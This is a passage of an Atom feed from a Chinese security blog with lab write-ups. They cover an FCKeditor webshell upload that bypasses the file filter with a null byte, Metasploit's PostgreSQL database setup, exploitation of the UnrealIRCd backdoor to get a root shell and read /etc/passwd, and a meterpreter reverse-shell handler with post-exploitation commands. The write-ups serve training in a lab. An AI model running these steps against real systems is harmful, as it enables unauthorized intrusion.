src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/9.JPG"></p><p>切换到浏览器，将2.asp改为2.asp.jpg，并上传</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/10.JPG"></p><p>此时burp会拦截上传的数据包</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/11.JPG"></p><p>点击<code>HEX</code>，切换hex模式,修改此处内容</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/12.JPG"></p><p>将<code>2e</code>修改为<code>00</code></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/13.JPG"></p><p>切换为raw，点击forward，发送请求，再次刷新上传页面，发现asp文件已经上传成功</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/14.JPG"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目的：Fckeditor为在线网页编辑器。本实验演示&lt;code&gt;Fckeditor2.4.2&lt;/code&gt;以下版本的一个编辑器上传漏洞。&lt;/p&gt;
&lt;p&gt;原理：Fckeditor在2.4.2以下存在一个直接上传任意文件的上传页面，可直接上传webshell。&lt;/p&gt;
&lt;p&gt;过</summary>
      
    
    
    
    
    <category term="-fckeditor -webshell" scheme="https://0xchang.github.io/tags/fckeditor-webshell/"/>
    
  </entry>
  
  <entry>
    <title>metasploit之PostgreSQL</title>
    <link href="https://0xchang.github.io/2021/12/21/metasploit%E4%B9%8BPostgreSQL/"/>
    <id>https://0xchang.github.io/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</id>
    <published>2021-12-21T04:24:10.000Z</published>
    <updated>2022-02-11T11:59:47.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p><p><code>db_connect</code>  链接数据库</p><p><code>db_disconnect</code>    断开连接</p><p><code>vulns</code>     查看数据库扫描的主机的漏洞</p><p><code>workspace</code>   工作空间，相对于独立的</p><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msfconsole,<code>db_status</code>查看数据库连接状态，如果已连接执行<code>db_disconnect</code></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/1.PNG"></p><p>exit退出软件，执行<code>service postgresql start</code>,启动数据库，<code>netstat -ntlp | grep postgre</code>查询是否启动成功，端口为<code>5432</code></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/2.PNG"></p><p>重新运行msf,<code>db_status</code>查看是否连接<code>数据库</code></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/3.PNG"></p><p><code>db_disconnect</code>断开连接，<code>db_status</code>查看连接状态</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/4.PNG"></p><p>手动使用命令连接数据库，须知<code>数据库名</code>，<code>用户名</code>，<code>ip</code>以及<code>密码</code>，新建窗口，查询数据库配置文件，执行<code>find / -name database.yml</code></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/5.PNG"></p><p><code>cat /usr/share/metasploit-framework/config/database.yml</code>，查看配置文件</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/6.PNG"></p><p>返回msf界面，db_connect查看使用方法，选择第二种<code>db_connect 用户名:密码@ip/数据库名</code>，配置信息是<code>development</code>标签内的</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/7.PNG"><br><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/8.PNG"></p><p>退出msf，执行<code>su postgres</code></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/9.PNG"></p><p>创建新用户sub1及密码：<code>createuser sub1 -P</code>,回车并输入密码123456两次，<code>createdb --owner=sub1 test</code>连接数据库test，完成后exit退出</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/10.PNG"></p><p>运行msfconsole，db_disconnect断开连接，执行<code>db_connect sub1:123456@localhost/test</code>连接刚才的数据库，<code>db_status</code>查看状态</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/11.PNG"></p><p>退出msf,编辑<code>/etc/postgresql/9.5/main/postgresql.conf</code>文件，<code>shift+：</code>输入<code>set number</code>调出行号</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/12.PNG"></p><p>找到59行，将#去掉，并且把<code>localhost</code>改为*，88行去掉#,然后保存退出</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/13.PNG"></p><p>编辑<code>/etc/postgresql/9.5/main/pg_hba.conf</code>,最后一行添加<code>host all all 0.0.0.0/32 md5</code>，保存退出</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/14.PNG"></p><p><code>service postgresql restart</code>，重启服务</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/15.PNG"></p><p>打开msf，<code>workspace --help</code>查看用法</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/16.PNG"></p><p><code>workspace -v</code>查看工作空间，只有默认的一个</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/17.PNG"></p><p><code>worksapce -a 1</code>,<code>workspace -a 2</code> 添加工作空间1，2，执行<code>workspace -v</code> 查看工作空间</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/18.PNG"></p><p><code>workspace -d 1</code>删除工作空间1，执行<code>workspace -v</code> 查看现有工作空间</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/19.PNG"></p><p><code>workspace 2</code>切换到工作空间2</p><p><code>workspace -d 2</code>删除工作空间2,自动切换到默认工作空间</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8BPostgreSQL/20.PNG"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;metasploit之PostgreSQL&quot;&gt;&lt;a href=&quot;#metasploit之PostgreSQL&quot; class=&quot;headerlink&quot; title=&quot;metasploit之PostgreSQL&quot;&gt;&lt;/a&gt;metasploit之PostgreSQL&lt;/</summary>
      
    
    
    
    
    <category term="msf" scheme="https://0xchang.github.io/tags/msf/"/>
    
    <category term="PostgreSQL" scheme="https://0xchang.github.io/tags/PostgreSQL/"/>
    
  </entry>
  
  <entry>
    <title>metasploit溢出UnrealIRCd后门漏洞</title>
    <link href="https://0xchang.github.io/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/"/>
    <id>https://0xchang.github.io/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-12-21T04:23:58.000Z</published>
    <updated>2022-02-11T11:59:48.059Z</updated>
    
    <content type="html"><![CDATA[<h2 id="metasploit溢出UnrealIRCd后门漏洞"><a href="#metasploit溢出UnrealIRCd后门漏洞" class="headerlink" title="metasploit溢出UnrealIRCd后门漏洞"></a>metasploit溢出UnrealIRCd后门漏洞</h2><h3 id="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"><a href="#目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限" class="headerlink" title="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"></a>目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限</h3><h3 id="原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"><a href="#原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。" class="headerlink" title="原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"></a>原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。</h3><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>利用nmap扫描主机，确定<code>6667</code>端口开放，对应服务为<code>unreal ircd</code></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="1"></p><p>终端输入msfconsole，进入msf后输入<code>search unreal ircd</code>，搜索相关工具和攻击载荷</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="2"></p><p>终端输入命令<code>use exploit/unix/irc/unreal_ircd_3281backdoor</code>,启用漏洞模块</p><p>输入show options,查看需要设置的相关选项<br><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/3.PNG" alt="3"><br>设置目标ip</p><p>run或者exploit,开始攻击，攻击成功后，建立shell会话</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/4.PNG" alt="4"></p><p>终端输入whoami，查看权限root，输入cat /etc/passwd，查看系统账户</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/5.PNG" alt="5"></p><p>本机4444端口建立远程会话</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;metasploit溢出UnrealIRCd后门漏洞&quot;&gt;&lt;a href=&quot;#metasploit溢出UnrealIRCd后门漏洞&quot; class=&quot;headerlink&quot; title=&quot;metasploit溢出UnrealIRCd后门漏洞&quot;&gt;&lt;/a&gt;metasplo</summary>
      
    
    
    
    
    <category term="metasploit" scheme="https://0xchang.github.io/tags/metasploit/"/>
    
    <category term="unrealircd" scheme="https://0xchang.github.io/tags/unrealircd/"/>
    
    <category term="后门" scheme="https://0xchang.github.io/tags/%E5%90%8E%E9%97%A8/"/>
    
    <category term="漏洞" scheme="https://0xchang.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>metasploit之meterpreter命令</title>
    <link href="https://0xchang.github.io/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/"/>
    <id>https://0xchang.github.io/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</id>
    <published>2021-12-21T04:22:46.000Z</published>
    <updated>2022-02-11T11:59:47.919Z</updated>
    
    <content type="html"><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p><p>输入<code>exploit -j</code>运行脚本，且在后台监听</p><p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p><p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p><p>执行<code>ps</code>查看进程</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p><p><code>getuid</code> 查看权限</p><p><code>pwd</code> 查看当前路径</p><p><code>screentshot</code>截图</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p><p><code>background</code>会话转入后台</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p><p>新建终端，进入/root目录下，查看截图</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p><p>实验结束</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;metasploit之meterpreter命令&quot;&gt;&lt;a href=&quot;#metasploit之meterpreter命令&quot; class=&quot;headerlink&quot; title=&quot;metasploit之meterpreter命令&quot;&gt;&lt;/a&gt;metasploit之met</summary>
      
    
    
    
    
    <category term="msf" scheme="https://0xchang.github.io/tags/msf/"/>
    
    <category term="meterpreter" scheme="https://0xchang.github.io/tags/meterpreter/"/>
    
  </entry>
  
</feed>
